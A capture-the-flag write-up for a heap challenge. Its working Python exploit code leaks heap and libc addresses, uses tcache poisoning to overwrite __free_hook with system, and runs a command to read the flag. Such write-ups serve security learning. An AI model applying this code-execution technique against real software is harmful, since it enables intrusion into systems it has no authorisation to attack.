# Solution

## Vulnerability

- arbitrary control of heap allocations

## Exploit
```python
def add(index, size):
    r.sendline(b"add")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    r.recvuntil(b"quit\n")


def remove(index):
    r.sendline(b"remove")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.recvuntil(b"quit\n")


def send(index, msg):
    r.sendline(b"send")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Send message: ", msg)
    r.recvuntil(b"quit\n")


def read(index):
    r.sendline(b"read")
    r.sendlineafter(b"Index: ", str(index).encode())
    addr = r.recvline()[:-1]+b"\x00\x00"
    r.recvuntil(b"quit\n")
    return addr
```
&nbsp;&nbsp;&nbsp;

- Leaking heap address  

We have to create two chunks and free them, then read address of heap which is stored in the second freed chunk.  
```python
add(0, 16)
add(1, 16)
remove(0)
remove(1)
heap_leak = u64(read(1))
```
- Libc address on heap  

To store a libc address on heap, we put chunk in unsorted bin, because then it will containt pointers to the main_arena(in libc).  
```python
add(0, 0x80)
add(1, 0x508)
add(2, 0x410)
remove(1)
add(1, 0x508)
```

- Leaking libc address  

We use tcache poisoning to allocate chunk at address where pointer to main_arena is stored.  
```python
def alloc_at(address,index):
    address = p64(address)
    add(index+1, 32)
    add(index, 32)
    remove(index+1)
    remove(index)
    send(index, address+b"\x00")
    add(index, 32)
    add(index, 32)
    return index
```
```python
libc_addr_index = alloc_at(addr_of_ptr_to_libc,8)
libc.address = u64(read(libc_addr_index)) - 0x1ecbe0
```

- Overwriting `__free_hook`  

Knowing libc address we can overwrite `__free_hook` with `system` using tcache poisoning and send().  
```python
free_hook = libc.symbols['__free_hook']
system = libc.address+0x000522c0

free_hook_index = alloc_at(free_hook,10)
send(free_hook_index, p64(system))
```

- Reading the flag  

We make new allocation at index 0 with string "cat flag.txt\x00". Calling remove(0) will execute `system("cat flag.txt\x00")`.
```python
add(0, 32)
send(0, b"cat flag.txt\x00")
r.sendline(b"remove")
r.sendlineafter(b"Index: ", b"0")
print("Flag:", r.recvuntil(b"}").decode())
```

[solve.py](solve.py)
